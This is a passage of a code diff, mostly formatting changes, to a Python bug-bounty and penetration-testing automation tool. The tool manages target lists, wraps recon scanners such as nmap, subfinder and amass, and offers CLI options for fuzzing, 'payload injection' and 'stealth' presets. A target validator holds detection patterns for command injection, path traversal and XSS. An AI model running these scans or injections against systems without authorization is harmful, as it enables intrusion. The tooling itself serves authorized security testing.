     t = input("\n\033[93mEnter target (domain or URL): \033[0m").strip()
@@ -7862,8 +9775,11 @@ def add_single_target():
             write_uniq(TARGETS, current_targets + [t])
             logger.log(f"✅ Target '{t}' added successfully", "SUCCESS")
     elif t:
-        logger.log("❌ Invalid target format. Use domain.com or http://domain.com", "ERROR")
+        logger.log(
+            "❌ Invalid target format. Use domain.com or http://domain.com", "ERROR"
+        )
     input("Press Enter to continue...")
+
 
 def add_multiple_targets():
     """Add multiple targets at once"""
@@ -7897,6 +9813,7 @@ def add_multiple_targets():
 
     input("Press Enter to continue...")
 
+
 def import_targets_from_file():
     """Import targets from a file"""
     p = input("\n\033[93mPath to file: \033[0m").strip()
@@ -7918,10 +9835,14 @@ def import_targets_from_file():
                     current_targets = read_lines(TARGETS)
                     new_targets = [t for t in valid_targets if t not in current_targets]
                     write_uniq(TARGETS, current_targets + new_targets)
-                    logger.log(f"✅ Imported {len(new_targets)} valid targets", "SUCCESS")
+                    logger.log(
+                        f"✅ Imported {len(new_targets)} valid targets", "SUCCESS"
+                    )
 
                     if invalid_count > 0:
-                        logger.log(f"⚠️ Skipped {invalid_count} invalid targets", "WARNING")
+                        logger.log(
+                            f"⚠️ Skipped {invalid_count} invalid targets", "WARNING"
+                        )
                 else:
                     logger.log("❌ No valid targets found in file", "ERROR")
             except Exception as e:
@@ -7931,6 +9852,7 @@ def import_targets_from_file():
     else:
         logger.log("❌ Invalid file path", "ERROR")
     input("Press Enter to continue...")
+
 
 def remove_individual_target():
     """Remove individual targets with selection menu"""
@@ -7945,16 +9867,25 @@ def remove_individual_target():
         print(f"    {i:2d}. {target}")
 
     try:
-        choice = input(f"\n\033[93mEnter target number to remove (1-{len(targets)}) or 'back': \033[0m").strip()
+        choice = input(
+            f"\n\033[93mEnter target number to remove (1-{len(targets)}) or 'back': \033[0m"
+        ).strip()
 
-        if choice.lower() == 'back':
+        if choice.lower() == "back":
             return
 
         if choice.isdigit():
             index = int(choice) - 1
             if 0 <= index < len(targets):
                 target_to_remove = targets[index]
-                if input(f"\n\033[91mConfirm removal of '{target_to_remove}'? (yes/no): \033[0m").strip().lower() == "yes":
+                if (
+                    input(
+                        f"\n\033[91mConfirm removal of '{target_to_remove}'? (yes/no): \033[0m"
+                    )
+                    .strip()
+                    .lower()
+                    == "yes"
+                ):
                     targets.pop(index)
                     write_lines(TARGETS, targets)
                     logger.log(f"✅ Target '{target_to_remove}' removed", "SUCCESS")
@@ -7969,11 +9900,12 @@ def remove_individual_target():
 
     input("Press Enter to continue...")
 
+
 def manage_target_lists():
     """Manage multiple target list files"""
-    print("\n\033[96m" + "="*60 + "\033[0m")
+    print("\n\033[96m" + "=" * 60 + "\033[0m")
     print("\033[96mTARGET LIST MANAGEMENT".center(60) + "\033[0m")
-    print("\033[96m" + "="*60 + "\033[0m")
+    print("\033[96m" + "=" * 60 + "\033[0m")
 
     # List existing target files
     target_files = list(HERE.glob("targets*.txt"))
@@ -8000,6 +9932,7 @@ def manage_target_lists():
 
     input("Press Enter to continue...")
 
+
 def create_target_categories():
     """Create categorized target lists"""
     categories = {
@@ -8007,7 +9940,7 @@ def create_target_categories():
         "staging": "Staging/Test Targets",
         "internal": "Internal/Private Targets",
         "external": "External/Public Targets",
-        "bounty": "Bug Bounty Targets"
+        "bounty": "Bug Bounty Targets",
     }
 
     print("\n\033[92m📂 Available Categories:\033[0m")
@@ -8026,6 +9959,7 @@ def create_target_categories():
         logger.log("❌ Invalid category", "ERROR")
 
     input("Press Enter to continue...")
+
 
 def validate_all_targets():
     """Validate all configured targets"""
@@ -8053,11 +9987,19 @@ def validate_all_targets():
     print(f"    ❌ Invalid: {len(invalid_targets)}")
 
     if invalid_targets:
-        if input(f"\n\033[93mRemove {len(invalid_targets)} invalid targets? (yes/no): \033[0m").strip().lower() == "yes":
+        if (
+            input(
+                f"\n\033[93mRemove {len(invalid_targets)} invalid targets? (yes/no): \033[0m"
+            )
+            .strip()
+            .lower()
+            == "yes"
+        ):
             write_lines(TARGETS, valid_targets)
             logger.log(f"✅ Removed {len(invalid_targets)} invalid targets", "SUCCESS")
 
     input("Press Enter to continue...")
+
 
 def clear_all_targets():
     """Clear all targets with confirmation"""
@@ -8074,10 +10016,12 @@ def clear_all_targets():
 
     input("Press Enter to continue...")
 
+
 # Supporting functions for enhanced target management
 def validate_target(target: str) -> bool:
     """Validate a single target (domain or IP)"""
     return validate_target_input(target) and validate_single_target(target)
+
 
 def validate_target_input(target: str) -> bool:
     """Validate target input format"""
@@ -8088,23 +10032,28 @@ def validate_target_input(target: str) -> bool:
     import re
 
     # More flexible domain pattern that allows single words for testing
-    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$'
-    url_pattern = r'^https?://[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*(/[^\s]*)?$'
-    ip_pattern = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
+    domain_pattern = r"^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$"
+    url_pattern = r"^https?://[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*(/[^\s]*)?$"
+    ip_pattern = r"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
 
     # Check for security threats first
     dangerous_patterns = [
-        r'[;&|`$(){}[\]\\]',  # Command injection
-        r'\.\./',             # Path traversal
-        r'<script',           # XSS
-        r'javascript:',       # JavaScript injection
+        r"[;&|`$(){}[\]\\]",  # Command injection
+        r"\.\./",  # Path traversal
+        r"<script",  # XSS
+        r"javascript:",  # JavaScript injection
     ]
 
     for dangerous in dangerous_patterns:
         if re.search(dangerous, target, re.IGNORECASE):
             return False
 
-    return bool(re.match(domain_pattern, target) or re.match(url_pattern, target) or re.match(ip_pattern, target))
+    return bool(
+        re.match(domain_pattern, target)
+        or re.match(url_pattern, target)
+        or re.match(ip_pattern, target)
+    )
+
 
 def validate_single_target(target: str) -> bool:
     """Validate a single target (basic format check)"""
@@ -8113,10 +10062,13 @@ def validate_single_target(target: str) -> bool:
     except Exception:
         return False
 
+
 def create_new_target_list():
     """Create a new target list file"""
     name = input("\n\033[93mEnter target list name: \033[0m").strip()
-    if name and validate_input(name, {"max_length": 50, "pattern": r"^[a-zA-Z0-9_-]+$"}):
+    if name and validate_input(
+        name, {"max_length": 50, "pattern": r"^[a-zA-Z0-9_-]+$"}
+    ):
         target_file = HERE / f"targets_{name}.txt"
         if not target_file.exists():
             target_file.touch()
@@ -8124,7 +10076,11 @@ def create_new_target_list():
         else:
             logger.log(f"📂 Target list '{name}' already exists", "WARNING")
     else:
-        logger.log("❌ Invalid name. Use only letters, numbers, underscore, and hyphen", "ERROR")
+        logger.log(
+            "❌ Invalid name. Use only letters, numbers, underscore, and hyphen",
+            "ERROR",
+        )
+
 
 def switch_active_target_list(target_files):
     """Switch to a different target list"""
@@ -8139,7 +10095,9 @@ def switch_active_target_list(target_files):
         print(f"    {i}. {tf.name} ({count} targets){current}")
 
     try:
-        choice = int(input(f"\n\033[93mSelect list (1-{len(target_files)}): \033[0m").strip())
+        choice = int(
+            input(f"\n\033[93mSelect list (1-{len(target_files)}): \033[0m").strip()
+        )
         if 1 <= choice <= len(target_files):
             selected_file = target_files[choice - 1]
             # Copy selected file to active targets.txt
@@ -8149,6 +10107,7 @@ def switch_active_target_list(target_files):
             logger.log("❌ Invalid selection", "ERROR")
     except ValueError:
         logger.log("❌ Invalid input", "ERROR")
+
 
 def merge_target_lists(target_files):
     """Merge multiple target lists"""
@@ -8177,6 +10136,7 @@ def merge_target_lists(target_files):
     except (ValueError, IndexError):
         logger.log("❌ Invalid selection", "ERROR")
 
+
 def delete_target_list(target_files):
     """Delete a target list"""
     if not target_files:
@@ -8195,10 +10155,19 @@ def delete_target_list(target_files):
         print(f"    {i}. {tf.name} ({count} targets)")
 
     try:
-        choice = int(input(f"\n\033[91mSelect list to DELETE (1-{len(deletable_files)}): \033[0m").strip())
+        choice = int(
+            input(
+                f"\n\033[91mSelect list to DELETE (1-{len(deletable_files)}): \033[0m"
+            ).strip()
+        )
         if 1 <= choice <= len(deletable_files):
             file_to_delete = deletable_files[choice - 1]
-            if input(f"\033[91mConfirm deletion of '{file_to_delete.name}'? (DELETE): \033[0m").strip() == "DELETE":
+            if (
+                input(
+                    f"\033[91mConfirm deletion of '{file_to_delete.name}'? (DELETE): \033[0m"
+                ).strip()
+                == "DELETE"
+            ):
                 file_to_delete.unlink()
                 logger.log(f"✅ Deleted target list: {file_to_delete.name}", "SUCCESS")
             else:
@@ -8207,6 +10176,7 @@ def delete_target_list(target_files):
             logger.log("❌ Invalid selection", "ERROR")
     except ValueError:
         logger.log("❌ Invalid input", "ERROR")
+
 
 def view_all_target_lists(target_files):
     """View all target lists with statistics"""
@@ -8232,15 +10202,21 @@ def view_all_target_lists(target_files):
                 print(f"     • {target}")
             print(f"     ... and {count - 3} more")
 
-    print(f"\n\033[96m📈 Total: {total_targets} targets across {len(target_files)} lists\033[0m")
+    print(
+        f"\n\033[96m📈 Total: {total_targets} targets across {len(target_files)} lists\033[0m"
+    )
+
 
 def refresh_and_merge():
     cfg = load_cfg()
     logger.log("Refreshing sources...", "INFO")
     sources = refresh_external_sources(cfg)
     logger.log("Merging wordlists...", "INFO")
-    merge_wordlists(sources["SecLists"], sources["PayloadsAllTheThings"], sources["Wordlists"])
+    merge_wordlists(
+        sources["SecLists"], sources["PayloadsAllTheThings"], sources["Wordlists"]
+    )
     logger.log("Sources refreshed and wordlists merged.", "SUCCESS")
+
 
 def run_recon():
     cfg = load_cfg()
@@ -8252,6 +10228,7 @@ def run_recon():
         logger.log(f"Recon complete. Run: {rd}", "SUCCESS")
     finally:
         cleanup_resource_monitor(stop_event, th)
+
 
 def run_vuln():
     cfg = load_cfg()
@@ -8296,8 +10273,11 @@ def generate_enhanced_report():
         env = env_with_lists()
 
         # Get latest run directory
-        runs = sorted([d for d in RUNS_DIR.iterdir() if d.is_dir()],
-                     key=lambda p: p.stat().st_mtime, reverse=True)
+        runs = sorted(
+            [d for d in RUNS_DIR.iterdir() if d.is_dir()],
+            key=lambda p: p.stat().st_mtime,
+            reverse=True,
+        )
         if not runs:
             logger.log("No runs found for reporting", "WARNING")
             return
@@ -8318,10 +10298,15 @@ def generate_enhanced_report():
     except Exception as e:
         logger.log(f"Enhanced report generation failed: {e}", "ERROR")
 
+
 def run_report_for_latest():
     cfg = load_cfg()
     env = env_with_lists()
-    runs = sorted([d for d in RUNS_DIR.iterdir() if d.is_dir()], key=lambda p: p.stat().st_mtime, reverse=True)
+    runs = sorted(
+        [d for d in RUNS_DIR.iterdir() if d.is_dir()],
+        key=lambda p: p.stat().st_mtime,
+        reverse=True,
+    )
     if not runs:
         logger.log("No runs to report", "WARNING")
         return
@@ -8334,10 +10319,11 @@ def run_report_for_latest():
         except Exception:
             logger.log(f"Open report: {html}", "INFO")
 
+
 def plugins_menu():
-    print("\n\033[96m" + "="*80 + "\033[0m")
+    print("\n\033[96m" + "=" * 80 + "\033[0m")
     print("\033[96mPLUGINS".center(80) + "\033[0m")
-    print("\033[96m" + "="*80 + "\033[0m")
+    print("\033[96m" + "=" * 80 + "\033[0m")
     print("\033[95m1. List\033[0m")
     print("\033[95m2. Create template\033[0m")
     print("\033[95m3. Execute plugin\033[0m")
@@ -8362,6 +10348,7 @@ def plugins_menu():
             rd = new_run()
             execute_plugin(name, rd, env_with_lists(), load_cfg())
 
+
 # ---------- Enhanced Automation Functions ----------
 def run_eslint_security_check():
     """Run ESLint security checks on JavaScript files"""
@@ -8370,7 +10357,10 @@ def run_eslint_security_check():
     try:
         # Check if Node.js and npm are available
         if not shutil.which("npm"):
-            logger.log("npm not found. Please install Node.js and npm for ESLint integration", "WARNING")
+            logger.log(
+                "npm not found. Please install Node.js and npm for ESLint integration",
+                "WARNING",
+            )
             input("Press Enter to continue...")
             return
 
@@ -8384,7 +10374,7 @@ def run_eslint_security_check():
                 cwd=str(HERE),
                 timeout=120,
                 capture=True,
-                check_return=False
+                check_return=False,
             )
 
             if result and result.returncode == 0:
@@ -8400,7 +10390,7 @@ def run_eslint_security_check():
             cwd=str(HERE),
             timeout=60,
             capture=True,
-            check_return=False
+            check_return=False,
         )
 
         if result:
@@ -8418,6 +10408,7 @@ def run_eslint_security_check():
 
     input("Press Enter to continue...")
 
+
 def run_bug_bounty_automation():
     """Run comprehensive bug bounty automation"""
     print("\n\033[96m=== Bug Bounty Automation ===\033[0m")
@@ -8431,9 +10422,10 @@ def run_bug_bounty_automation():
 
         # Get primary target (first one)
         primary_target = targets[0].strip()
-        if primary_target.startswith(('http://', 'https://')):
+        if primary_target.startswith(("http://", "https://")):
             # Extract domain from URL
             from urllib.parse import urlparse
+
             parsed = urlparse(primary_target)
             primary_target = parsed.netloc
 
@@ -8448,6 +10440,7 @@ def run_bug_bounty_automation():
 
         # Make sure script is executable
         import stat
+
         current_perms = bug_bounty_script.stat().st_mode
         bug_bounty_script.chmod(current_perms | stat.S_IEXEC)
 
@@ -8464,7 +10457,7 @@ def run_bug_bounty_automation():
             cwd=str(HERE),
             timeout=1800,  # 30 minutes timeout
             capture=True,
-            check_return=False
+            check_return=False,
         )
 
         if result:
@@ -8475,15 +10468,27 @@ def run_bug_bounty_automation():
                 bug_bounty_results = HERE / "bug_bounty_results"
                 if bug_bounty_results.exists():
                     import shutil as sh
-                    sh.copytree(bug_bounty_results, run_dir / "bug_bounty_results", dirs_exist_ok=True)
-                    logger.log(f"Results copied to: {run_dir / 'bug_bounty_results'}", "INFO")
+
+                    sh.copytree(
+                        bug_bounty_results,
+                        run_dir / "bug_bounty_results",
+                        dirs_exist_ok=True,
+                    )
+                    logger.log(
+                        f"Results copied to: {run_dir / 'bug_bounty_results'}", "INFO"
+                    )
 
             else:
-                logger.log(f"Bug bounty automation completed with warnings (exit code: {result.returncode})", "WARNING")
+                logger.log(
+                    f"Bug bounty automation completed with warnings (exit code: {result.returncode})",
+                    "WARNING",
+                )
 
             # Show summary output
             if result.stdout:
-                print(f"\nBug Bounty Summary:\n{result.stdout[-1000:]}")  # Last 1000 chars
+                print(
+                    f"\nBug Bounty Summary:\n{result.stdout[-1000:]}"
+                )  # Last 1000 chars
         else:
             logger.log("Bug bounty automation failed to execute", "ERROR")
 
@@ -8491,6 +10496,7 @@ def run_bug_bounty_automation():
         logger.log(f"Bug bounty automation error: {e}", "ERROR")
 
     input("Press Enter to continue...")
+
 
 def run_automated_testing_chain():
     """Run comprehensive automated testing chain"""
@@ -8532,6 +10538,7 @@ def run_automated_testing_chain():
 
     input("Press Enter to continue...")
 
+
 def run_enhanced_recon():
     """Run enhanced reconnaissance with additional tools"""
     print("\n\033[96m=== Enhanced Reconnaissance ===\033[0m")
@@ -8561,6 +10568,7 @@ def run_enhanced_recon():
 
     logger.log("Enhanced reconnaissance completed", "SUCCESS")
 
+
 def enhanced_subdomain_enum(targets, run_dir, cfg):
     """Enhanced subdomain enumeration with multiple tools"""
     logger.log("Running enhanced subdomain enumeration...", "INFO")
@@ -8584,7 +10592,7 @@ def enhanced_subdomain_enum(targets, run_dir, cfg):
                         ["subfinder", "-d", target, "-silent"],
                         capture=True,
                         timeout=300,
-                        check_return=False
+                        check_return=False,
                     )
                 elif tool == "amass":
                     result = safe_execute(
@@ -8592,7 +10600,7 @@ def enhanced_subdomain_enum(targets, run_dir, cfg):
                         ["amass", "enum", "-d", target, "-passive"],
                         capture=True,
                         timeout=300,
-                        check_return=False
+                        check_return=False,
                     )
                 elif tool == "assetfinder":
                     result = safe_execute(
@@ -8600,18 +10608,21 @@ def enhanced_subdomain_enum(targets, run_dir, cfg):
                         ["assetfinder", "--subs-only", target],
                         capture=True,
                         timeout=300,
-                        check_return=False
+                        check_return=False,
                     )
 
                 if result and result.stdout:
-                    results.extend(result.stdout.strip().split('\n'))
+                    results.extend(result.stdout.strip().split("\n"))
 
         # Deduplicate and save results
         if results:
             unique_subdomains = sorted(set(filter(None, results)))
             subdomain_file = run_dir / f"subdomains_{target.replace('.', '_')}.txt"
             write_lines(subdomain_file, unique_subdomains)
-            logger.log(f"Found {len(unique_subdomains)} subdomains for {target}", "SUCCESS")
+            logger.log(
+                f"Found {len(unique_subdomains)} subdomains for {target}", "SUCCESS"
+            )
+
 
 def enhanced_port_scanning(targets, run_dir, cfg):
     """Enhanced port scanning with multiple tools"""
@@ -8632,14 +10643,15 @@ def enhanced_port_scanning(targets, run_dir, cfg):
                 ["nmap", "-T4", "-top-ports", "1000", "--open", "-oG", "-", target],
                 capture=True,
                 timeout=600,
-                check_return=False
+                check_return=False,
             )
 
             if result and result.stdout:
                 ports_file = run_dir / f"ports_{target.replace('.', '_')}.txt"
-                with open(ports_file, 'w') as f:
+                with open(ports_file, "w") as f:
                     f.write(result.stdout)
                 logger.log(f"Port scan completed for {target}", "SUCCESS")
+
 
 def enhanced_tech_detection(targets, run_dir, cfg):
     """Enhanced technology detection"""
@@ -8651,7 +10663,7 @@ def enhanced_tech_detection(targets, run_dir, cfg):
             continue
 
         # Ensure target has protocol
-        if not target.startswith(('http://', 'https://')):
+        if not target.startswith(("http://", "https://")):
             target = f"https://{target}"
 
         # Use httpx for technology detection
@@ -8661,13 +10673,16 @@ def enhanced_tech_detection(targets, run_dir, cfg):
                 ["httpx", "-u", target, "-tech-detect", "-title", "-silent"],
                 capture=True,
                 timeout=60,
-                check_return=False
+                check_return=False,
             )
 
             if result and result.stdout:
-                tech_file = run_dir / f"tech_{target.replace('://', '_').replace('.', '_')}.txt"
-                with open(tech_file, 'w') as f:
+                tech_file = (
+                    run_dir / f"tech_{target.replace('://', '_').replace('.', '_')}.txt"
+                )
+                with open(tech_file, "w") as f:
                     f.write(result.stdout)
+
 
 def enhanced_web_crawling(targets, run_dir, cfg):
     """Enhanced web crawling for URL collection"""
@@ -8684,14 +10699,10 @@ def enhanced_web_crawling(targets, run_dir, cfg):
         # GAU - Get All URLs
         if shutil.which("gau"):
             result = safe_execute(
-                run_cmd,
-                ["gau", target],
-                capture=True,
-                timeout=120,
-                check_return=False
+                run_cmd, ["gau", target], capture=True, timeout=120, check_return=False
             )
             if result and result.stdout:
-                all_urls.update(result.stdout.strip().split('\n'))
+                all_urls.update(result.stdout.strip().split("\n"))
 
         # Waybackurls
         if shutil.which("waybackurls"):
@@ -8700,18 +10711,25 @@ def enhanced_web_crawling(targets, run_dir, cfg):
                 ["waybackurls", target],
                 capture=True,
                 timeout=120,
-                check_return=False
+                check_return=False,
             )
             if result and result.stdout:
-                all_urls.update(result.stdout.strip().split('\n'))
+                all_urls.update(result.stdout.strip().split("\n"))
 
         # Save collected URLs
         if all_urls:
-            filtered_urls = [url for url in all_urls if url and url.startswith(('http://', 'https://'))]
+            filtered_urls = [
+                url
+                for url in all_urls
+                if url and url.startswith(("http://", "https://"))
+            ]
             if filtered_urls:
                 urls_file = run_dir / f"urls_{target.replace('.', '_')}.txt"
                 write_lines(urls_file, sorted(filtered_urls))
-                logger.log(f"Collected {len(filtered_urls)} URLs for {target}", "SUCCESS")
+                logger.log(
+                    f"Collected {len(filtered_urls)} URLs for {target}", "SUCCESS"
+                )
+
 
 # ---------- Enhanced Menu Functions ----------
 def run_ai_vulnerability_analysis():
@@ -8720,11 +10738,17 @@ def run_ai_vulnerability_analysis():
 
     try:
         # Find latest scan results
-        runs = sorted([d for d in RUNS_DIR.iterdir() if d.is_dir()],
-                     key=lambda p: p.stat().st_mtime, reverse=True)
+        runs = sorted(
+            [d for d in RUNS_DIR.iterdir() if d.is_dir()],
+            key=lambda p: p.stat().st_mtime,
+            reverse=True,
+        )
 
         if not runs:
-            logger.log("No scan results found. Please run a vulnerability scan first.", "WARNING")
+            logger.log(
+                "No scan results found. Please run a vulnerability scan first.",
+                "WARNING",
+            )
             input("Press Enter to continue...")
             return
 
@@ -8739,13 +10763,19 @@ def run_ai_vulnerability_analysis():
 
         # Display results
         if ml_out.exists():
-            with open(ml_out, 'r') as f:
+            with open(ml_out, "r") as f:
                 results = json.load(f)
 
             print("\n[REPORT] AI Analysis Results:")
-            print(f"   False Positive Reduction: {results.get('false_positive_reduction', {}).get('reduction_percentage', 0):.1f}%")
-            print(f"   Risk Level: {results.get('risk_scoring', {}).get('risk_level', 'unknown').upper()}")
-            print(f"   Total Risk Score: {results.get('risk_scoring', {}).get('total_risk_score', 0)}")
+            print(
+                f"   False Positive Reduction: {results.get('false_positive_reduction', {}).get('reduction_percentage', 0):.1f}%"
+            )
+            print(
+                f"   Risk Level: {results.get('risk_scoring', {}).get('risk_level', 'unknown').upper()}"
+            )
+            print(
+                f"   Total Risk Score: {results.get('risk_scoring', {}).get('total_risk_score', 0)}"
+            )
 
         logger.log("AI vulnerability analysis completed", "SUCCESS")
 
@@ -8753,6 +10783,7 @@ def run_ai_vulnerability_analysis():
         logger.log(f"AI analysis error: {e}", "ERROR")
 
     input("Press Enter to continue...")
+
 
 def run_cloud_security_assessment():
     """Run cloud security assessment"""
@@ -8786,6 +10817,7 @@ def run_cloud_security_assessment():
 
     input("Press Enter to continue...")
 
+
 def run_api_security_testing():
     """Run API security testing"""
     print("\n\033[96m=== API Security Testing ===\033[0m")
@@ -8818,6 +10850,7 @@ def run_api_security_testing():
 
     input("Press Enter to continue...")
 
+
 def run_compliance_assessment():
     """Run compliance and risk assessment"""
     print("\n\033[96m=== Compliance & Risk Assessment ===\033[0m")
@@ -8838,7 +10871,10 @@ def run_compliance_assessment():
         # Run compliance checks for each target
         for target in targets:
             target_url = target if target.startswith("http") else f"http://{target}"
-            compliance_out = run_dir / f"compliance_{target.replace('.', '_').replace('/', '_')}.json"
+            compliance_out = (
+                run_dir
+                / f"compliance_{target.replace('.', '_').replace('/', '_')}.json"
+            )
 
             run_compliance_checks(target_url, compliance_out, cfg, env)
 
@@ -8848,6 +10884,7 @@ def run_compliance_assessment():
         logger.log(f"Compliance assessment error: {e}", "ERROR")
 
     input("Press Enter to continue...")
+
 
 def run_cicd_integration_mode():
     """Run CI/CD integration mode"""
@@ -8898,6 +10935,7 @@ def run_cicd_integration_mode():
 
     input("Press Enter to continue...")
 
+
 def setup_argument_parser() -> argparse.ArgumentParser:
     """Setup comprehensive command-line argument parser"""
     parser = argparse.ArgumentParser(
@@ -8934,89 +10972,128 @@ Output Options:
   --quiet                   Minimal output
   --verbose                 Detailed output
   --debug                   Debug mode with extensive logging
-        """
+        """,
     )
 
     # Main options
-    parser.add_argument('-t', '--target', type=str,
-                       help='Target domain/IP or file containing targets')
-    parser.add_argument('--targets-file', type=str,
-                       help='File containing list of targets (one per line)')
-    parser.add_argument('--batch', action='store_true',
-                       help='Batch mode - non-interactive execution')
-    parser.add_argument('--interactive', action='store_true',
-                       help='Launch interactive menu interface (default)')
+    parser.add_argument(
+        "-t", "--target", type=str, help="Target domain/IP or file containing targets"
+    )
+    parser.add_argument(
+        "--targets-file",
+        type=str,
+        help="File containing list of targets (one per line)",
+    )
+    parser.add_argument(
+        "--batch", action="store_true", help="Batch mode - non-interactive execution"
+    )
+    parser.add_argument(
+        "--interactive",
+        action="store_true",
+        help="Launch interactive menu interface (default)",
+    )
 
     # Scan types
-    scan_group = parser.add_argument_group('Scan Types')
-    scan_group.add_argument('--recon', action='store_true',
-                           help='Run enhanced reconnaissance scan')
-    scan_group.add_argument('--vuln', action='store_true',
-                           help='Run advanced vulnerability assessment')
-    scan_group.add_argument('--full', action='store_true',
-                           help='Run complete pipeline (recon + vuln + report)')
-    scan_group.add_argument('--bcar', action='store_true',
-                           help='Run BCAR enhanced reconnaissance')
-    scan_group.add_argument('--takeover', action='store_true',
-                           help='Run subdomain takeover detection')
-    scan_group.add_argument('--fuzz', action='store_true',
-                           help='Run comprehensive fuzzing')
-    scan_group.add_argument('--payload-inject', action='store_true',
-                           help='Run automated payload injection')
-    scan_group.add_argument('--preset', choices=['fast', 'deep', 'stealth', 'aggressive'],
-                           help='Use predefined scan preset')
+    scan_group = parser.add_argument_group("Scan Types")
+    scan_group.add_argument(
+        "--recon", action="store_true", help="Run enhanced reconnaissance scan"
+    )
+    scan_group.add_argument(
+        "--vuln", action="store_true", help="Run advanced vulnerability assessment"
+    )
+    scan_group.add_argument(
+        "--full",
+        action="store_true",
+        help="Run complete pipeline (recon + vuln + report)",
+    )
+    scan_group.add_argument(
+        "--bcar", action="store_true", help="Run BCAR enhanced reconnaissance"
+    )
+    scan_group.add_argument(
+        "--takeover", action="store_true", help="Run subdomain takeover detection"
+    )
+    scan_group.add_argument(
+        "--fuzz", action="store_true", help="Run comprehensive fuzzing"
+    )
+    scan_group.add_argument(
+        "--payload-inject", action="store_true", help="Run automated payload injection"
+    )
+    scan_group.add_argument(
+        "--preset",
+        choices=["fast", "deep", "stealth", "aggressive"],
+        help="Use predefined scan preset",
+    )
 
     # Configuration
-    config_group = parser.add_argument_group('Configuration')
-    config_group.add_argument('--config', type=str,
-                             help='Path to custom configuration file')
-    config_group.add_argument('--threads', type=int, default=0,
-                             help='Number of threads (0 = auto)')
-    config_group.add_argument('--timeout', type=int, default=600,
-                             help='Scan timeout in seconds')
-    config_group.add_argument('--rate-limit', type=int, default=50,
-                             help='Rate limit (requests per second)')
-    config_group.add_argument('--depth', type=int, default=3,
-                             help='Scanning depth level (1-5)')
+    config_group = parser.add_argument_group("Configuration")
+    config_group.add_argument(
+        "--config", type=str, help="Path to custom configuration file"
+    )
+    config_group.add_argument(
+        "--threads", type=int, default=0, help="Number of threads (0 = auto)"
+    )
+    config_group.add_argument(
+        "--timeout", type=int, default=600, help="Scan timeout in seconds"
+    )
+    config_group.add_argument(
+        "--rate-limit", type=int, default=50, help="Rate limit (requests per second)"
+    )
+    config_group.add_argument(
+        "--depth", type=int, default=3, help="Scanning depth level (1-5)"
+    )
 
     # Output options
-    output_group = parser.add_argument_group('Output Options')
-    output_group.add_argument('--output', choices=['json', 'xml', 'html', 'txt'],
-                             default='txt', help='Output format')
-    output_group.add_argument('--outfile', type=str,
-                             help='Save results to specified file')
-    output_group.add_argument('--quiet', '-q', action='store_true',
-                             help='Minimal output')
-    output_group.add_argument('--verbose', '-v', action='store_true',
-                             help='Verbose output')
-    output_group.add_argument('--debug', action='store_true',
-                             help='Debug mode with extensive logging')
+    output_group = parser.add_argument_group("Output Options")
+    output_group.add_argument(
+        "--output",
+        choices=["json", "xml", "html", "txt"],
+        default="txt",
+        help="Output format",
+    )
+    output_group.add_argument(
+        "--outfile", type=str, help="Save results to specified file"
+    )
+    output_group.add_argument(
+        "--quiet", "-q", action="store_true", help="Minimal output"
+    )
+    output_group.add_argument(
+        "--verbose", "-v", action="store_true", help="Verbose output"
+    )
+    output_group.add_argument(
+        "--debug", action="store_true", help="Debug mode with extensive logging"
+    )
 
     # Advanced options
-    advanced_group = parser.add_argument_group('Advanced Options')
-    advanced_group.add_argument('--wordlist', type=str,
-                               help='Custom wordlist file')
-    advanced_group.add_argument('--payloads', type=str,
-                               help='Custom payloads file')
-    advanced_group.add_argument('--exclude', type=str,
-                               help='Exclude patterns (comma-separated)')
-    advanced_group.add_argument('--include-only', type=str,
-                               help='Include only patterns (comma-separated)')
-    advanced_group.add_argument('--user-agent', type=str,
-                               help='Custom User-Agent string')
-    advanced_group.add_argument('--proxy', type=str,
-                               help='Proxy URL (http://host:port)')
+    advanced_group = parser.add_argument_group("Advanced Options")
+    advanced_group.add_argument("--wordlist", type=str, help="Custom wordlist file")
+    advanced_group.add_argument("--payloads", type=str, help="Custom payloads file")
+    advanced_group.add_argument(
+        "--exclude", type=str, help="Exclude patterns (comma-separated)"
+    )
+    advanced_group.add_argument(
+        "--include-only", type=str, help="Include only patterns (comma-separated)"
+    )
+    advanced_group.add_argument(
+        "--user-agent", type=str, help="Custom User-Agent string"
+    )
+    advanced_group.add_argument(
+        "--proxy", type=str, help="Proxy URL (http://host:port)"
+    )
 
     # Tool management
-    tools_group = parser.add_argument_group('Tool Management')
-    tools_group.add_argument('--install-tools', action='store_true',
-                            help='Install missing security tools')
-    tools_group.add_argument('--check-tools', action='store_true',
-                            help='Check tool availability and exit')
-    tools_group.add_argument('--update-wordlists', action='store_true',
-                            help='Update wordlists and exit')
+    tools_group = parser.add_argument_group("Tool Management")
+    tools_group.add_argument(
+        "--install-tools", action="store_true", help="Install missing security tools"
+    )
+    tools_group.add_argument(
+        "--check-tools", action="store_true", help="Check tool availability and exit"
+    )
+    tools_group.add_argument(
+        "--update-wordlists", action="store_true", help="Update wordlists and exit"
+    )
 
     return parser
+
 
 def handle_cli_execution(args):
     """Handle command-line execution based on parsed arguments"""
@@ -9069,13 +11146,13 @@ def handle_cli_execution(args):
         if args.target:
             if Path(args.target).exists():
                 # It's a file
-                with open(args.target, 'r') as f:
+                with open(args.target, "r") as f:
                     targets = [line.strip() for line in f if line.strip()]
             else:
                 # It's a single target
                 targets = [args.target]
         elif args.targets_file:
-            with open(args.targets_file, 'r') as f:
+            with open(args.targets_file, "r") as f:
                 targets = [line.strip() for line in f if line.strip()]
 
         if not targets:
@@ -9098,7 +11175,7 @@ def handle_cli_execution(args):
         cfg = load_cfg()
         if args.config:
             try:
